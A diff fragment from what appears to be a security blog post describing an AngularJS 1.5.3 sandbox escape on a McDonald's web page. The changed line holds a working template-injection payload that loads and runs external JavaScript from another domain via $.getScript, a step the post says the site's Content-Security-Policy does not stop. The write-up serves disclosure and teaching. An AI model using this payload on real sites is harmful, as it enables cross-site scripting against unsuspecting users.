@@ -56,7 +56,7 @@ The version is 1.5.3, so the sandbox escape we need is `{% raw %}{{x = {'y':''.c
 
 We can even load external JavaScript files using the following sandbox escape, which results in the alert below.
 
-    {% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://finnwea.com/snippets/external-alert.js`)');}}{% endraw %}` 
+{% raw %}{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=$.getScript(`https://finnwea.com/snippets/external-alert.js`)');}}{% endraw %}
 
 The JavaScript can be loaded from another domain since McDonald's doesn't exclude it using the `Content-Security-Policy` header.
 
